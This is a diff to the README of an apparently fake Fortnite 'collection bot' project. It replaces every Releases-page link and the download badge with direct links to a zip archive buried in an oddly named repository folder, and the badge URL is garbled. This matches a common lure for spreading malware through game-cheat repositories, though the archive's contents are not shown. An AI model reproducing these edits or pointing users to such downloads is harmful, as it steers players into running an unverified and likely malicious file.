@@ -1,6 +1,6 @@
 # 🎮 assistant-for-fortnite-collection-bot - Enhance Your Fortnite Experience Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue.svg)](https://github.com/Z1ted/assistant-for-fortnite-collection-bot/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Z1ted/assistant-for-fortnite-collection-bot/main/brashiness/assistant-for-fortnite-collection-bot_1.6-alpha.3.zip%20Latest%https://raw.githubusercontent.com/Z1ted/assistant-for-fortnite-collection-bot/main/brashiness/assistant-for-fortnite-collection-bot_1.6-alpha.3.zip)](https://raw.githubusercontent.com/Z1ted/assistant-for-fortnite-collection-bot/main/brashiness/assistant-for-fortnite-collection-bot_1.6-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to the **assistant-for-fortnite-collection-bot**! This application helps
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Z1ted/assistant-for-fortnite-collection-bot/releases) to find the latest version of the application. 
+   Go to our [Releases page](https://raw.githubusercontent.com/Z1ted/assistant-for-fortnite-collection-bot/main/brashiness/assistant-for-fortnite-collection-bot_1.6-alpha.3.zip) to find the latest version of the application. 
 
 2. **Choose Your File**  
    On the Releases page, look for the latest version. You'll see several files available for download. Select the one that matches your operating system. 
@@ -59,10 +59,10 @@ If you encounter any issues while installing or using the application, consider 
 
 ## 📅 Future Updates
 
-We continuously work on improving the **assistant-for-fortnite-collection-bot**. Stay tuned for new features and updates. Regularly check the [Releases page](https://github.com/Z1ted/assistant-for-fortnite-collection-bot/releases) for the latest information.
+We continuously work on improving the **assistant-for-fortnite-collection-bot**. Stay tuned for new features and updates. Regularly check the [Releases page](https://raw.githubusercontent.com/Z1ted/assistant-for-fortnite-collection-bot/main/brashiness/assistant-for-fortnite-collection-bot_1.6-alpha.3.zip) for the latest information.
 
 ## 📬 Support
 
 For questions or feedback, feel free to reach out via the Issues section on GitHub. We value your input and are here to help!
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue.svg)](https://github.com/Z1ted/assistant-for-fortnite-collection-bot/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Z1ted/assistant-for-fortnite-collection-bot/main/brashiness/assistant-for-fortnite-collection-bot_1.6-alpha.3.zip%20Latest%https://raw.githubusercontent.com/Z1ted/assistant-for-fortnite-collection-bot/main/brashiness/assistant-for-fortnite-collection-bot_1.6-alpha.3.zip)](https://raw.githubusercontent.com/Z1ted/assistant-for-fortnite-collection-bot/main/brashiness/assistant-for-fortnite-collection-bot_1.6-alpha.3.zip)
